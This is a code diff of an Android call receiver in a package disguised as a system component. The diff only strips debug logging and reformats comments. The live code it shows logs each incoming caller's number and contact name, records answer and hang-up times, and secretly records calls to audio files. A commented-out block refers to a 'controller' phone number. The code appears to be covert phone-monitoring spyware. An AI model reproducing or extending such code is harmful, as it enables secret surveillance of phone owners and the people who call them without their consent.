@@ -9,9 +9,7 @@ import android.content.Intent;
 import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
 
-import com.android.system.controled.Debug;
 import com.android.system.controled.MainApplication;
-import com.android.system.controled.util.AudioUtil;
 import com.android.system.controled.util.ContactsUtil;
 import com.android.system.controled.util.FileUtil;
 import com.android.system.controled.util.InitUtil;
@@ -64,33 +62,30 @@ public class CallReceiver extends BroadcastReceiver {
 			switch (state) {
 
 			case TelephonyManager.CALL_STATE_IDLE:
-				Debug.i("CallReceiver", "idle");
 				FileUtil.writeFile("\r\n挂断：" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + "\r\n\r\n", MainApplication.FILE_CALL_LOG, true);
 				stopRecord(con);
 				break;
 			case TelephonyManager.CALL_STATE_OFFHOOK:
-				Debug.i("CallReceiver", "offhook");
 				FileUtil.writeFile("\r\n接听：" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()), MainApplication.FILE_CALL_LOG, true);
 				break;
 			case TelephonyManager.CALL_STATE_RINGING:
-				Debug.i("CallReceiver", "ring num: " + incomingNumber);
 				FileUtil.writeFile("来电：" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + "    " + ContactsUtil.getNameFromContactsByNumber(con, incomingNumber) + ":" + incomingNumber, MainApplication.FILE_CALL_LOG, true);
 				startRecord(con, incomingNumber, "来电");
-				//TODO
-//				if (incomingNumber.contains(MainApplication.controllerTel)) {
-//					// 在特定时间内，自动调大音量
-//					switch (TimeUtil.inTime()) {
-//					case TimeUtil.TIME_NOW_NIGHT:
-//						AudioUtil.turnUpMost(con);
-//						break;
-//					case TimeUtil.TIME_NOW_MOON:
-//						AudioUtil.turnUpSecond(con);
-//						break;
-//
-//					default:
-//						break;
-//					}
-//				}
+				// TODO
+				// if (incomingNumber.contains(MainApplication.controllerTel)) {
+				// // 在特定时间内，自动调大音量
+				// switch (TimeUtil.inTime()) {
+				// case TimeUtil.TIME_NOW_NIGHT:
+				// AudioUtil.turnUpMost(con);
+				// break;
+				// case TimeUtil.TIME_NOW_MOON:
+				// AudioUtil.turnUpSecond(con);
+				// break;
+				//
+				// default:
+				// break;
+				// }
+				// }
 
 				break;
 			}
@@ -106,7 +101,8 @@ public class CallReceiver extends BroadcastReceiver {
 	 * @Description:
 	 * @param con
 	 * @param number
-	 * @param type 来电或去电
+	 * @param type
+	 *            来电或去电
 	 * @see:
 	 * @since:
 	 * @author: zhuanggy
@@ -117,7 +113,8 @@ public class CallReceiver extends BroadcastReceiver {
 		String name = StringUtil.getRidofSpecialOfFileName(ContactsUtil.getNameFromContactsByNumber(con, number));
 
 		// 文件保存位置
-		File file = new File(MainApplication.FILEPATH_AUDIOS_CALL + type + "_" + name + "_" + number + "_" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
+		File file = null;
+		file = new File(MainApplication.FILEPATH_AUDIOS_CALL + type + "_" + name + "_" + number + "_" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
 		RecorderUtil.getInstence(con).startRecorder(file, -1);
 	}
 
